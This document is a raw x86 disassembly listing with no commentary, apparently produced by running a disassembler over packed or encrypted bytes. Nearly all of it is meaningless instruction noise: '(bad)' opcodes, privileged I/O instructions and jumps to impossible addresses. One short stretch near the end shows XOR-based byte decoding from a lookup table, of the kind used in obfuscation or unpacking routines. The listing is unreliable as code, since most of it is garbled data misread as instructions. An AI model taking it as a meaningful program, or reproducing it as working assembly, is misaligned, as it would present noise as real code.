  4059a2:	mov    BYTE PTR [esi-0x1cd97ac2],bl
  4059a8:	test   al,0xd8
  4059aa:	cmp    DWORD PTR ds:0x1244aa7d,0x5863db99
  4059b4:	ins    BYTE PTR es:[edi],dx
  4059b5:	js     0x4059ff
  4059b7:	int3   
  4059b8:	les    ebx,FWORD PTR [ebx+0x17]
  4059bb:	push   ds
  4059bc:	mov    dh,0xe
  4059be:	push   0xf61f5170
  4059c3:	addr16 push eax
  4059c5:	push   ss
  4059c6:	sar    bh,cl
  4059c8:	mov    eax,0xde6233fa
  4059cd:	mov    bl,0xd6
  4059cf:	sbb    ah,BYTE PTR ds:0x81c1dd76
  4059d5:	sub    edx,DWORD PTR [esi]
  4059d7:	sub    ecx,DWORD PTR [esp+eiz*4+0x37]
  4059db:	pop    ds
  4059dc:	push   ds
  4059dd:	fwait
  4059de:	xchg   ebx,eax
  4059df:	xor    eax,0xd8920d35
  4059e4:	dec    eax
  4059e5:	lock xchg esp,eax
  4059e7:	loopne 0x4059f3
  4059e9:	dec    esp
  4059ea:	cmp    edi,eax
  4059ec:	mov    dl,0x35
  4059ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059ef:	gs fwait
  4059f1:	jle    0x4059c8
  4059f3:	pop    esp
  4059f4:	jnp    0x4059ae
  4059f6:	inc    ebp
  4059f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059f8:	loop   0x405a36
  4059fa:	shl    edx,1
  4059fc:	pop    esp
  4059fd:	xor    BYTE PTR [eax-0x68fa3634],dh
  405a03:	pusha  
  405a04:	jmp    0xbf0b:0x70e743e3
  405a0b:	mov    ds:0xb3e8ea84,eax
  405a10:	sti    
  405a11:	jle    0x405a5d
  405a13:	mov    dl,0xea
  405a15:	mov    esp,0x7024776
  405a1a:	(bad)  
  405a1b:	lds    edi,FWORD PTR [eax-0x5c760d60]
  405a21:	ds sub eax,0xfa715bf4
  405a27:	mov    edx,0x92057975
  405a2c:	mov    bh,0x55
  405a2e:	mov    ebp,0x1a1d169e
  405a33:	xchg   edi,eax
  405a34:	sbb    al,BYTE PTR [ecx+0x7646aa1b]
  405a3a:	fidivr DWORD PTR [eax+0x5a]
  405a3d:	mov    dh,0x9d
  405a3f:	ins    BYTE PTR es:[edi],dx
  405a40:	jmp    0xc8824c70
  405a45:	call   DWORD PTR [ecx+eax*2-0x1c]
  405a49:	xor    al,0x6f
  405a4b:	shl    BYTE PTR [edx+edx*4+0x4da7e243],1
  405a52:	pop    esp
  405a53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a54:	sbb    edx,DWORD PTR [esi+0x18e2feaf]
  405a5a:	lods   eax,DWORD PTR ds:[esi]
  405a5b:	iret   
  405a5c:	inc    edx
  405a5d:	pushf  
  405a5e:	cld    
  405a5f:	mov    dl,0xc0
  405a61:	lods   al,BYTE PTR ds:[esi]
  405a62:	(bad)  
  405a63:	push   ebp
  405a64:	rol    DWORD PTR [eax-0x5b],1
  405a67:	repz push esp
  405a69:	add    bh,BYTE PTR [edx*4-0x5900176a]
  405a70:	ret    0x554f
  405a73:	dec    esi
  405a74:	cli    
  405a75:	push   ecx
  405a76:	icebp  
  405a77:	pop    ss
  405a78:	mov    WORD PTR [edi-0x42],cs
  405a7b:	out    0xa3,al
  405a7d:	add    DWORD PTR [edi],ebx
  405a7f:	ja     0x405a46
  405a81:	rcr    DWORD PTR [ecx+0x21167714],cl
  405a87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a88:	aam    0x84
  405a8a:	and    esi,DWORD PTR [esi+0x3f1a803e]
  405a90:	test   al,0x68
  405a92:	daa    
  405a93:	in     al,dx
  405a94:	scas   al,BYTE PTR es:[edi]
  405a95:	scas   eax,DWORD PTR es:[edi]
  405a96:	mov    bh,0xdc
  405a98:	(bad)  
  405a99:	pop    edx
  405a9a:	and    eax,0xc7332297
  405a9f:	mov    BYTE PTR [esi-0xa],bh
  405aa2:	out    dx,al
  405aa3:	scas   eax,DWORD PTR es:[edi]
  405aa4:	jl     0x405aa4
  405aa6:	fwait
  405aa7:	scas   eax,DWORD PTR es:[edi]
  405aa8:	or     ebx,DWORD PTR ds:[ebp+0x56]
  405aac:	cmp    DWORD PTR [edi+0x53],ebx
  405aaf:	jnp    0x405ad9
  405ab1:	pop    ds
  405ab2:	sub    ebp,DWORD PTR [ebp+edx*8+0x1eb88bf]
  405ab9:	cdq    
  405aba:	sahf   
  405abb:	neg    ebp
  405abd:	xor    DWORD PTR ds:0x4e398eec,0x70
  405ac4:	repnz out 0x7f,al
  405ac7:	sub    BYTE PTR [ecx-0x3e],bl
  405aca:	xor    eax,0x7d7a049a
  405acf:	out    dx,al
  405ad0:	mov    dl,BYTE PTR [esi+0x29]
  405ad3:	cwde   
  405ad4:	or     eax,0x493c5d62
  405ad9:	rol    BYTE PTR [edx+0xa5ebfa1],0xa5
  405ae0:	fisttp WORD PTR [edi-0x65f928d6]
  405ae6:	pushf  
  405ae7:	push   ebp
  405ae8:	(bad)
  405aec:	mov    al,ds:0xb5b354a7
  405af1:	ja     0x405a9d
  405af3:	adc    BYTE PTR [edi],0x7d
  405af6:	jp     0x405a90
  405af8:	std    
  405af9:	xchg   edi,eax
  405afa:	jmp    0x5419cdb3
  405aff:	test   bh,0x81
  405b02:	jecxz  0x405ad3
  405b04:	cdq    
  405b05:	mov    bh,0x3d
  405b07:	jg     0x405b33
  405b09:	cmp    BYTE PTR [ecx+0x6653b6cb],0x5
  405b10:	sahf   
  405b11:	fidiv  WORD PTR [ecx]
  405b13:	(bad)  
  405b14:	aaa    
  405b15:	sahf   
  405b16:	addr16 pop edx
  405b18:	(bad)  
  405b19:	stc    
  405b1a:	test   DWORD PTR [edx],edx
  405b1c:	xchg   esp,eax
  405b1d:	cmp    esp,edx
  405b1f:	js     0x405ab7
  405b21:	sbb    bh,al
  405b23:	jnp    0x405aec
  405b25:	ins    BYTE PTR es:[edi],dx
  405b26:	outs   dx,DWORD PTR ds:[esi]
  405b27:	leave  
  405b28:	push   ds
  405b29:	jns    0x405b0f
  405b2b:	sbb    DWORD PTR [ecx-0xed7e3db],0xcae232b0
  405b35:	inc    ecx
  405b36:	push   edx
  405b37:	test   ah,0x8d
  405b3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b3b:	lods   eax,DWORD PTR ds:[esi]
  405b3c:	xchg   ebp,eax
  405b3d:	add    DWORD PTR cs:[edx],edx
  405b40:	pop    ebx
  405b41:	mov    ch,0x24
  405b43:	enter  0xa449,0x50
  405b47:	inc    esp
  405b48:	cmp    BYTE PTR [edi],0x5b
  405b4b:	cwde   
  405b4c:	fbld   TBYTE PTR [ebp+0x28]
  405b4f:	shl    al,0x96
  405b52:	stos   BYTE PTR es:[edi],al
  405b53:	int    0x99
  405b55:	pop    esi
  405b56:	(bad)  
  405b57:	lods   eax,DWORD PTR ds:[esi]
  405b58:	enter  0x3a02,0x4c
  405b5c:	das    
  405b5d:	call   0x2e55:0xc85ef75a
  405b64:	loope  0x405b02
  405b66:	xor    al,0xcb
  405b68:	lahf   
  405b69:	fstp   DWORD PTR [ebx]
  405b6b:	xchg   edx,eax
  405b6c:	push   eax
  405b6d:	mov    WORD PTR [edi-0x531996fb],ss
  405b73:	outs   dx,BYTE PTR es:[esi]
  405b75:	mov    ecx,0x6da2e9f4
  405b7a:	inc    edx
  405b7b:	call   0x2ea0eb5f
  405b80:	ins    BYTE PTR es:[edi],dx
  405b81:	ds sar cl,1
  405b84:	or     al,0xc
  405b86:	out    0xf3,al
  405b88:	inc    eax
  405b89:	lahf   
  405b8a:	sub    DWORD PTR [ebp+esi*4+0x24],ecx
  405b8e:	pop    esi
  405b8f:	add    DWORD PTR [esp+eiz*8+0x39],ebx
  405b93:	fisttp QWORD PTR [edx+0x4eea4384]
  405b99:	lods   eax,DWORD PTR ds:[esi]
  405b9a:	ja     0x405b5e
  405b9c:	stc    
  405b9d:	mov    dh,0x49
  405b9f:	mov    esi,0x7f499b5
  405ba4:	add    eax,ebp
  405ba6:	test   esp,esi
  405ba8:	add    DWORD PTR [esi+0x64],edi
  405bab:	pop    es
  405bac:	lock cli 
  405bae:	pop    ebx
  405baf:	repz push edi
  405bb1:	clc    
  405bb2:	mov    WORD PTR [esi+0xa2c1ee7],cs
  405bb8:	nop
  405bb9:	lods   eax,DWORD PTR gs:[esi]
  405bbb:	mov    bh,0xc3
  405bbd:	mov    DWORD PTR [eax+0x21ac00c2],esp
  405bc3:	sub    eax,0x7a285daa
  405bc8:	loopne 0x405be7
  405bca:	mov    eax,ds:0xcce08189
  405bcf:	dec    BYTE PTR ss:[edi]
  405bd2:	jno    0x405bec
  405bd4:	iret   
  405bd5:	pop    ebp
  405bd6:	test   eax,0xed1ffb93
  405bdb:	or     al,0x7a
  405bdd:	pop    esp
  405bde:	pushf  
  405bdf:	xchg   edx,eax
  405be0:	rol    DWORD PTR [ebx],1
  405be2:	push   edx
  405be3:	xchg   ecx,eax
  405be4:	inc    ebx
  405be5:	ret    0xf8b9
  405be8:	sub    ch,BYTE PTR [eax-0x39]
  405beb:	xchg   edi,eax
  405bec:	sbb    bh,bh
  405bee:	test   eax,0x6e014511
  405bf3:	and    al,0x58
  405bf5:	or     eax,DWORD PTR [esi-0x9c11eb4]
  405bfb:	aaa    
  405bfc:	pop    ebx
  405bfd:	mov    dh,BYTE PTR [edi]
  405bff:	fild   WORD PTR [ecx]
  405c01:	mov    ah,0x39
  405c03:	cs loope 0x405c03
  405c06:	cmp    DWORD PTR [ebx-0xc],ebx
  405c09:	int    0x57
  405c0b:	mov    esi,DWORD PTR [ecx+esi*2+0x4b212c84]
  405c12:	push   eax
  405c13:	xchg   edx,eax
  405c14:	lods   eax,DWORD PTR ds:[esi]
  405c15:	adc    dh,bh
  405c17:	rcl    DWORD PTR [eax+0x39],cl
  405c1a:	mov    ah,0x5e
  405c1c:	mov    WORD PTR [ecx],cs
  405c1e:	mov    fs,WORD PTR [edi+eax*8]
  405c21:	fstp   TBYTE PTR [edx]
  405c23:	call   0xb364e5e2
  405c28:	js     0x405c4b
  405c2a:	mov    eax,ds:0x31aabbf0
  405c2f:	jb     0x405c2a
  405c31:	stos   DWORD PTR es:[edi],eax
  405c32:	inc    ecx
  405c33:	nop
  405c34:	sub    DWORD PTR [ebp+0x5f2d9fc3],eax
  405c3a:	sbb    eax,0x9cefb482
  405c3f:	push   ebp
  405c40:	stos   DWORD PTR es:[edi],eax
  405c41:	je     0x405c23
  405c43:	scas   eax,DWORD PTR es:[edi]
  405c44:	xor    eax,DWORD PTR [ebp+0x52e6f726]
  405c4a:	xor    al,0xd0
  405c4c:	ins    DWORD PTR es:[edi],dx
  405c4d:	retf   0xa20d
  405c50:	or     eax,0x8033849e
  405c55:	mov    edx,0x30d5a951
  405c5a:	scas   al,BYTE PTR es:[edi]
  405c5b:	xchg   esi,eax
  405c5c:	xchg   esi,eax
  405c5d:	fwait
  405c5e:	mov    dl,0x9f
  405c60:	mov    DWORD PTR [eax],eax
  405c62:	lahf   
  405c63:	or     eax,0xc8e3c135
  405c68:	mov    ebx,0xeb41da20
  405c6d:	sub    DWORD PTR [eax+0x1a54aa0f],0xa376e46b
  405c77:	dec    edi
  405c78:	std    
  405c79:	ss cmp dl,bh
  405c7c:	repnz icebp 
  405c7e:	pop    ebx
  405c7f:	xor    BYTE PTR [edi],0x13
  405c82:	sbb    cl,BYTE PTR [ebx]
  405c84:	xor    edi,DWORD PTR [edi]
  405c86:	sub    eax,0x4d1cbf6e
  405c8b:	rcr    DWORD PTR [ebx-0x69],1
  405c8e:	pop    esi
  405c8f:	(bad)  
  405c90:	dec    esp
  405c91:	mov    ch,0xab
  405c93:	data16 ins BYTE PTR es:[edi],dx
  405c95:	pop    ss
  405c96:	repnz mov dh,0xfa
  405c99:	stos   BYTE PTR es:[edi],al
  405c9a:	lahf   
  405c9b:	and    dh,BYTE PTR [ebx]
  405c9d:	imul   eax,DWORD PTR [esi+0x0],0xffffffc1
  405ca1:	repz add al,0x90
  405ca4:	mov    BYTE PTR [ebp+0x43],ch
  405ca7:	mov    ds,WORD PTR [edi+ebx*1-0x1e]
  405cab:	pop    ebp
  405cac:	aaa    
  405cad:	cmp    al,0x2a
  405caf:	or     cl,BYTE PTR ds:[edi]
  405cb2:	pop    eax
  405cb3:	stos   BYTE PTR es:[edi],al
  405cb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cb5:	inc    esi
  405cb6:	aam    0x53
  405cb8:	and    DWORD PTR [esi],0x34
  405cbb:	lock or eax,0x3886357e
  405cc1:	jno    0x405c4f
  405cc3:	dec    eax
  405cc4:	ja     0x405c4b
  405cc6:	(bad)  
  405cc7:	fcom   DWORD PTR [ebp-0x1ebf1442]
  405ccd:	in     eax,dx
  405cce:	pop    es
  405ccf:	push   ebp
  405cd0:	retf   0x7bd6
  405cd3:	push   ecx
  405cd4:	or     BYTE PTR [ebp+0x7391d952],ch
  405cda:	sbb    DWORD PTR [ecx],0x611fd301
  405ce0:	push   ss
  405ce1:	sub    bh,BYTE PTR [eax]
  405ce3:	push   ds
  405ce4:	jg     0x405ce3
  405ce6:	aad    0x48
  405ce8:	mov    ss,WORD PTR [ecx-0x3f]
  405ceb:	jbe    0x405ccf
  405ced:	cmp    BYTE PTR [esi-0x1a],bl
  405cf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cf1:	lds    ebp,FWORD PTR [edx+0x5f7bda19]
  405cf7:	add    ebp,DWORD PTR [ebp-0x7a]
  405cfa:	std    
  405cfb:	sub    dh,bl
  405cfd:	in     al,dx
  405cfe:	es dec ecx
  405d00:	mov    bl,0x5d
  405d02:	int3   
  405d03:	push   0x49
  405d05:	dec    ch
  405d07:	sub    esp,DWORD PTR [eax+0x381a4253]
  405d0d:	push   esp
  405d0e:	sub    eax,0xcfcf2ea4
  405d13:	mov    dh,0xae
  405d15:	daa    
  405d16:	pop    es
  405d17:	mov    ecx,0x23629dd1
  405d1c:	inc    ebp
  405d1d:	aaa    
  405d1e:	push   ebp
  405d1f:	es push ebx
  405d21:	push   eax
  405d22:	push   ecx
  405d23:	adc    eax,0x965210ff
  405d28:	test   ah,ch
  405d2a:	fcmovnbe st,st(2)
  405d2c:	retf   
  405d2d:	xchg   esp,eax
  405d2e:	pop    ebx
  405d2f:	in     eax,dx
  405d30:	jno    0x405da9
  405d32:	fistp  QWORD PTR [esi+edi*8+0x65]
  405d36:	dec    edx
  405d37:	cs int3 
  405d39:	mov    al,ds:0x7a6fb4f5
  405d3e:	or     al,0x5d
  405d40:	test   BYTE PTR [ebx],ch
  405d42:	ja     0x405d94
  405d44:	sbb    DWORD PTR cs:[eax],eax
  405d47:	jmp    0x405cd1
  405d49:	pusha  
  405d4a:	or     eax,DWORD PTR [esi-0x678ad9b6]
  405d50:	pop    ds
  405d51:	sbb    al,0x3d
  405d53:	xlat   BYTE PTR ds:[ebx]
  405d54:	fcom   st(7)
  405d56:	outs   dx,DWORD PTR ds:[esi]
  405d57:	setg   BYTE PTR ds:[ebp+0x59e13a]
  405d5f:	cmp    BYTE PTR [esp+eiz*2+0x67395934],al
  405d66:	(bad)  
  405d67:	sub    ecx,DWORD PTR ds:0xb4ac5428
  405d6d:	or     BYTE PTR [edi],bh
  405d6f:	push   0xde0cc000
  405d74:	cli    
  405d75:	hlt    
  405d76:	pop    eax
  405d77:	ja     0x405d13
  405d79:	fnstenv ds:0x53089e49
  405d7f:	mov    BYTE PTR [ebp-0xeaa0df3],dh
  405d85:	stc    
  405d86:	xor    DWORD PTR [ecx+0x17c2f85a],ebx
  405d8c:	out    dx,eax
  405d8d:	(bad)  
  405d8e:	mov    al,ds:0x97bd6a6
  405d93:	mov    ah,0x17
  405d95:	js     0x405d2c
  405d97:	mov    ebx,0x987c3946
  405d9c:	sub    DWORD PTR [ecx+0x9],ebx
  405d9f:	jb     0x405d5b
  405da1:	in     eax,0xce
  405da3:	sbb    dl,BYTE PTR [ebx+0x57ce01b1]
  405da9:	jmp    0x9901c91c
  405dae:	ror    BYTE PTR [eax-0x262dd75f],0x8
  405db5:	je     0x405d67
  405db7:	bound  ebp,QWORD PTR [eax+0x5b41f449]
  405dbd:	inc    edx
  405dbe:	shr    DWORD PTR [ebx],1
  405dc0:	adc    DWORD PTR [ebx],edi
  405dc2:	jno    0x405d5e
  405dc4:	push   ds
  405dc5:	fsubr  DWORD PTR [ebx+edx*8]
  405dc8:	sub    BYTE PTR [eax+eiz*8],bh
  405dcb:	and    dl,BYTE PTR [ecx-0x44]
  405dce:	lods   al,BYTE PTR ds:[esi]
  405dcf:	inc    eax
  405dd0:	xor    ah,bh
  405dd2:	stos   BYTE PTR es:[edi],al
  405dd3:	shl    BYTE PTR [edi],cl
  405dd5:	or     eax,0x4c5b7414
  405dda:	or     bh,BYTE PTR [ebp-0x11]
  405ddd:	xchg   ebp,eax
  405dde:	cld    
  405ddf:	aas    
  405de0:	sbb    bl,BYTE PTR [ebx-0x57]
  405de3:	mov    edx,0x7ea59b23
  405de8:	mov    eax,0xa87804aa
  405ded:	imul   ebp,edi,0xee7728e6
  405df3:	shl    DWORD PTR [ecx],cl
  405df5:	repnz push ecx
  405df7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405df8:	loopne 0x405db4
  405dfa:	mov    ebp,0xc58c76a3
  405dff:	jns    0x405dfd
  405e01:	xchg   dh,bl
  405e03:	inc    eax
  405e04:	xchg   ebx,eax
  405e05:	adc    DWORD PTR [edi-0x3b],esp
  405e08:	int    0xc8
  405e0a:	or     dl,BYTE PTR [esi-0x3e]
  405e0d:	push   esi
  405e0e:	push   ecx
  405e0f:	out    0x2a,al
  405e11:	outs   dx,BYTE PTR ds:[esi]
  405e12:	push   eax
  405e13:	ja     0x405e71
  405e15:	sub    eax,0x542ce6e4
  405e1a:	sahf   
  405e1b:	(bad)  
  405e1c:	pop    ss
  405e1d:	jle    0x405db6
  405e1f:	and    BYTE PTR [edi],ah
  405e21:	adc    BYTE PTR [ebp+0x6ef9c412],ch
  405e27:	(bad)  
  405e28:	std    
  405e29:	xchg   edi,eax
  405e2a:	mov    eax,ds:0xda03b4e9
  405e2f:	cld    
  405e30:	lods   al,BYTE PTR ds:[esi]
  405e31:	std    
  405e32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e33:	mov    dh,0xbd
  405e35:	fild   DWORD PTR [ebx+0x35]
  405e38:	mov    esi,0xd7a85f30
  405e3d:	dec    edi
  405e3e:	ds mov ebp,0xe77d41d
  405e44:	lahf   
  405e45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e46:	nop
  405e47:	and    ch,dh
  405e49:	(bad)  
  405e4a:	je     0x405e89
  405e4c:	mov    ch,0x70
  405e4e:	lock fisttp DWORD PTR [edx+0x69fa7aec]
  405e55:	push   edi
  405e56:	or     eax,0x5ebf9acf
  405e5b:	std    
  405e5c:	jecxz  0x405df5
  405e5e:	fstp   st(5)
  405e60:	imul   eax,DWORD PTR [eax-0x18],0x42a05233
  405e67:	sub    BYTE PTR [eax],cl
  405e69:	xchg   ebp,eax
  405e6a:	popa   
  405e6b:	inc    eax
  405e6c:	xchg   edx,eax
  405e6d:	push   0x44
  405e6f:	dec    ecx
  405e70:	cmp    ebp,DWORD PTR [edx+0x5f]
  405e73:	popa   
  405e74:	push   ds
  405e75:	adc    cl,al
  405e77:	or     BYTE PTR ds:0x6ac99650,cl
  405e7d:	cli    
  405e7e:	mov    bl,0x70
  405e80:	stc    
  405e81:	push   esi
  405e82:	mov    edi,0x41f6be10
  405e87:	iret   
  405e88:	fadd   DWORD PTR [edx+0x64]
  405e8b:	in     eax,0x5c
  405e8d:	call   0x2065854e
  405e92:	ja     0x405edb
  405e94:	fadd   DWORD PTR [ebp-0x47b4c6db]
  405e9a:	and    eax,0x3853a31
  405e9f:	mov    al,BYTE PTR [esi+eiz*1-0x33]
  405ea3:	mov    ecx,DWORD PTR [ecx-0x5df97712]
  405ea9:	es inc esp
  405eab:	stos   BYTE PTR es:[edi],al
  405eac:	fmulp  st(4),st
  405eae:	inc    edi
  405eaf:	pusha  
  405eb0:	mov    ds:0xa17f9647,eax
  405eb5:	xor    eax,0x7b7b0052
  405eba:	mov    WORD PTR [ebx+0x6f89f8f2],?
  405ec0:	xchg   ecx,eax
  405ec1:	jb     0x405e64
  405ec3:	enter  0xebd4,0xa8
  405ec7:	aad    0x6c
  405ec9:	repnz mov esi,DWORD PTR [esi-0x62]
  405ecd:	fst    QWORD PTR [edx]
  405ecf:	add    edx,esi
  405ed1:	mov    DWORD PTR [edi],ebp
  405ed3:	dec    ecx
  405ed4:	test   eax,0x980fd1e
  405ed9:	xchg   esi,eax
  405eda:	mov    ch,0xdb
  405edc:	dec    edi
  405edd:	hlt    
  405ede:	std    
  405edf:	pop    ds
  405ee0:	jp     0x405e65
  405ee2:	inc    esp
  405ee3:	fistp  DWORD PTR [ebp+edi*1+0x10cecf13]
  405eea:	xor    eax,0x7fe7c052
  405eef:	mov    dh,0x4a
  405ef1:	push   ds
  405ef2:	es cmp ch,0xcf
  405ef6:	aad    0xec
  405ef8:	pop    esi
  405ef9:	cbw    
  405efb:	xchg   ecx,eax
  405efc:	jge    0x405f50
  405efe:	and    DWORD PTR [eax+eax*1-0x4b67901a],esi
  405f05:	shl    DWORD PTR [esi+0x7ed4f19],1
  405f0b:	inc    edi
  405f0c:	inc    edx
  405f0d:	fnsave [edi+0x44]
  405f10:	sbb    eax,0xa42880a
  405f15:	push   0xffffffcb
  405f17:	mov    ?,WORD PTR [edi]
  405f19:	mov    edi,0x31523b9a
  405f1e:	adc    ebp,DWORD PTR [ebx-0x5019a804]
  405f24:	mov    eax,0xe7715f00
  405f29:	xchg   ebp,eax
  405f2a:	pop    esi
  405f2b:	popa   
  405f2c:	icebp  
  405f2d:	mov    ch,0x55
  405f2f:	aam    0x5c
  405f31:	mov    edx,0xe9184ec3
  405f36:	retf   0x78e8
  405f39:	or     ecx,ebx
  405f3b:	rcr    DWORD PTR [edi+0x6b],cl
  405f3e:	jne    0x405fae
  405f40:	push   eax
  405f41:	add    eax,0x3245f86c
  405f46:	sbb    edi,DWORD PTR [ebx+0x699a1975]
  405f4c:	stos   BYTE PTR es:[edi],al
  405f4d:	sbb    al,BYTE PTR [edi-0x27856676]
  405f53:	sbb    DWORD PTR [edx+0x670a98de],ebp
  405f59:	sbb    ch,ch
  405f5b:	push   0x9f811ff7
  405f60:	ja     0x405f20
  405f62:	int    0x3b
  405f64:	mov    ecx,DWORD PTR [ecx]
  405f66:	retfw  0x2814
  405f6a:	sub    DWORD PTR ds:0xecd9639e,esi
  405f70:	jp     0x405fdb
  405f72:	cmp    eax,0xd04111e0
  405f77:	das    
  405f78:	inc    esp
  405f79:	stc    
  405f7a:	ret    
  405f7b:	sbb    esi,DWORD PTR [esp+ebx*1+0x2709ca7c]
  405f82:	pop    eax
  405f83:	cmp    DWORD PTR [eax+0x2c433852],ecx
  405f89:	sbb    ebx,ebx
  405f8b:	imul   BYTE PTR [eax]
  405f8d:	bound  ecx,QWORD PTR [esi-0xa]
  405f90:	push   esi
  405f91:	lods   al,BYTE PTR ds:[esi]
  405f92:	inc    edi
  405f93:	ja     0x405f8f
  405f95:	mov    DWORD PTR [esi-0x64e41ddf],0xbf9b4bc7
  405f9f:	xchg   esp,eax
  405fa0:	mov    BYTE PTR [edx],ch
  405fa2:	push   ds
  405fa3:	icebp  
  405fa4:	int    0x6f
  405fa6:	xor    DWORD PTR [ebp-0x44740f13],edi
  405fac:	or     eax,0xa2560416
  405fb1:	repz pop es
  405fb3:	add    ah,dl
  405fb5:	or     al,0xf6
  405fb7:	mov    ?,WORD PTR [edi-0x5f75d11b]
  405fbd:	enter  0x7725,0xd5
  405fc1:	je     0x405fa8
  405fc3:	xchg   edx,eax
  405fc4:	jle    0x405f5d
  405fc6:	sbb    edx,DWORD PTR [eax]
  405fc8:	mov    ch,0x41
  405fca:	mov    bl,0x5a
  405fcc:	aad    0xab
  405fce:	mov    ebp,0x6657eeb7
  405fd3:	xchg   esp,eax
  405fd4:	or     cl,ch
  405fd6:	lea    esi,[edi-0x5]
  405fd9:	mov    bl,0x26
  405fdb:	int3   
  405fdc:	sbb    bl,BYTE PTR [esi-0x23]
  405fdf:	jge    0x406030
  405fe1:	mov    dl,BYTE PTR [eax]
  405fe3:	mov    BYTE PTR [esi],dh
  405fe5:	adc    cl,BYTE PTR [eax-0x1d]
  405fe8:	fldenv [ecx+0x43f18bc1]
  405fee:	addr16 mov edi,0x2359479
  405ff4:	or     ch,BYTE PTR [ebp+0x7beb620f]
  405ffa:	sar    BYTE PTR [ecx*8+0x5c583be5],1
  406001:	ret    0x3508
  406004:	(bad)  
  406005:	adc    cl,dh
  406007:	ja     0x406067
  406009:	push   ds
  40600a:	inc    edi
  40600b:	jecxz  0x405fe4
  40600d:	jecxz  0x405fda
  40600f:	jno    0x406041
  406011:	mov    bl,0xfa
  406013:	add    dl,BYTE PTR [ecx+0xe]
  406016:	cwde   
  406017:	enter  0x75e9,0x49
  40601b:	rcr    esp,1
  40601d:	dec    esp
  40601e:	popf   
  40601f:	ss mov dl,0x2c
  406022:	adc    BYTE PTR [ebx+0x6a],dh
  406025:	cmp    ebx,ebx
  406027:	mov    bl,0x6c
  406029:	clc    
  40602a:	dec    esp
  40602b:	test   eax,0x1c48d25a
  406030:	idiv   DWORD PTR [ebx+0x65]
  406033:	out    0x8d,eax
  406035:	sbb    al,0x54
  406037:	or     eax,0xcb41307e
  40603c:	and    BYTE PTR [ebx-0x2c],0x28
  406040:	lea    ebx,[esi+0x7c13886]
  406046:	jg     0x40609e
  406048:	gs mov bl,0x6a
  40604b:	repz inc edx
  40604d:	sti    
  40604e:	xor    al,0xd8
  406050:	int    0x1a
  406052:	jbe    0x405ff4
  406054:	repnz mov dh,0x5b
  406057:	scas   eax,DWORD PTR es:[edi]
  406058:	jp     0x406037
  40605a:	lods   eax,DWORD PTR ds:[esi]
  40605b:	xchg   esi,eax
  40605c:	push   esi
  40605d:	mov    bh,0x1f
  40605f:	add    eax,0xa2c30868
  406064:	jae    0x405feb
  406066:	nop
  406067:	fisttp WORD PTR [ebx-0x6ebe2579]
  40606d:	push   esp
  40606e:	fwait
  40606f:	jbe    0x405fff
  406071:	cmp    eax,0x2f5b851f
  406076:	std    
  406077:	jno    0x4060cb
  406079:	sbb    BYTE PTR [ebp+0x27],dl
  40607c:	leave  
  40607d:	cli    
  40607e:	lods   eax,DWORD PTR ds:[esi]
  40607f:	inc    ecx
  406080:	sub    cl,cl
  406082:	fld    TBYTE PTR [ebp+0x42]
  406085:	inc    ebx
  406086:	jge    0x406050
  406088:	enter  0xfa6a,0x1b
  40608c:	pop    es
  40608d:	mov    ch,0x5
  40608f:	fwait
  406090:	sub    eax,0xcafe0c81
  406095:	sbb    DWORD PTR [eax],ebx
  406097:	(bad)  
  406098:	mov    cl,0x5f
  40609a:	std    
  40609b:	ss hlt 
  40609d:	cld    
  40609e:	push   ss
  40609f:	das    
  4060a0:	push   es
  4060a1:	sbb    BYTE PTR [edi+ebp*2-0x12dedcde],dl
  4060a8:	pop    ecx
  4060a9:	jbe    0x406052
  4060ab:	adc    DWORD PTR [ebx],ebp
  4060ad:	push   esp
  4060ae:	test   DWORD PTR [edi+0x49f6354d],ecx
  4060b4:	cmp    eax,0x9f0f0292
  4060b9:	es scas eax,DWORD PTR es:[edi]
  4060bb:	imul   ebp,edx,0x7c
  4060be:	repz test eax,0xd3e81365
  4060c4:	adc    cl,ah
  4060c6:	inc    eax
  4060c7:	or     edx,DWORD PTR [eax+0x3e]
  4060ca:	mov    edx,DWORD PTR [ebp-0xc]
  4060cd:	xor    eax,esi
  4060cf:	add    eax,edi
  4060d1:	imul   eax,edx
  4060d4:	mov    edx,DWORD PTR [ebp-0x28]
  4060d7:	xor    edx,esi
  4060d9:	add    eax,edx
  4060db:	mov    edx,DWORD PTR [ebp-0x8]
  4060de:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f8]
  4060e6:	mov    edx,DWORD PTR [ebp-0x50]
  4060e9:	xor    edx,esi
  4060eb:	lea    eax,[edx+eax*1+0x3272f8]
  4060f2:	movzx  edx,BYTE PTR [ebp-0x1]
  4060f6:	xor    edx,eax
  4060f8:	mov    BYTE PTR [ebp-0x1],dl
  4060fb:	mov    al,BYTE PTR [ebp-0x1]
  4060fe:	mov    edx,DWORD PTR [ebp-0x30]
  406101:	mov    ebx,DWORD PTR [ebp-0xc]
  406104:	xor    edx,esi
  406106:	add    edx,edi
  406108:	imul   edx,ebx
  40610b:	jmp    0x408462
  406110:	add    eax,edx
  406112:	test   BYTE PTR [esi+edx*2],al
  406115:	pop    eax
  406116:	add    edx,ebx
  406118:	push   edx
  406119:	popf   
  40611a:	and    dl,bh
  40611c:	nop
  40611d:	dec    ecx
  40611e:	sbb    esp,DWORD PTR [edi+ebp*8]
  406121:	sar    DWORD PTR [ebx+0x7b],0xb5
  406125:	sahf   
  406126:	jnp    0x4061a3
  406128:	dec    edi
  406129:	fisub  WORD PTR [ecx-0x63071a5c]
  40612f:	sbb    al,0xe5
  406131:	popa   
  406132:	sub    al,0xa
  406134:	xchg   esi,eax
  406135:	fisttp WORD PTR [esi]
  406137:	(bad)  
  406138:	in     al,0x2a
  40613a:	add    al,0x7b
  40613c:	pop    edx
  40613d:	dec    edx
  40613e:	mov    edi,DWORD PTR [edi]
  406140:	mov    esp,0x76ba4614
  406145:	add    ah,cl
  406147:	xchg   esp,eax
  406148:	lock sbb eax,0x9cd8b676
  40614e:	adc    eax,0x1b43e694
  406153:	pop    eax
  406154:	ffreep st(3)
